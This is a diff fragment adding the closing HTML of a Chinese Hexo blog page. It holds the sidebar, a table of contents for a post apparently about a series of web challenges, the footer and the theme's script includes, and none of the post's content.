+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://norw1nd.github.io/" title="Norw1nd" target="_blank">Norw1nd</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://Xvgeng.github.io/" title="Xvgeng" target="_blank">Xvgeng</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Warmup"><span class="nav-number">1.1.</span> <span class="nav-text">1.Warmup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Adobe"><span class="nav-number">1.2.</span> <span class="nav-text">2.Adobe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Json"><span class="nav-number">1.3.</span> <span class="nav-text">3.Json</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-JavaScript"><span class="nav-number">1.4.</span> <span class="nav-text">4.JavaScript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-MarkDown"><span class="nav-number">1.5.</span> <span class="nav-text">5.MarkDown</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-DOM"><span class="nav-number">1.6.</span> <span class="nav-text">6.DOM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-CallBack"><span class="nav-number">1.7.</span> <span class="nav-text">7.CallBack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-Skandia"><span class="nav-number">1.8.</span> <span class="nav-text">8.Skandia </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-Template"><span class="nav-number">1.9.</span> <span class="nav-text">9.Template </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-Json2"><span class="nav-number">1.10.</span> <span class="nav-text">10.Json2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-CallBack2"><span class="nav-number">1.11.</span> <span class="nav-text">11.CallBack2</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Noel</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.4.2</div>-->
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
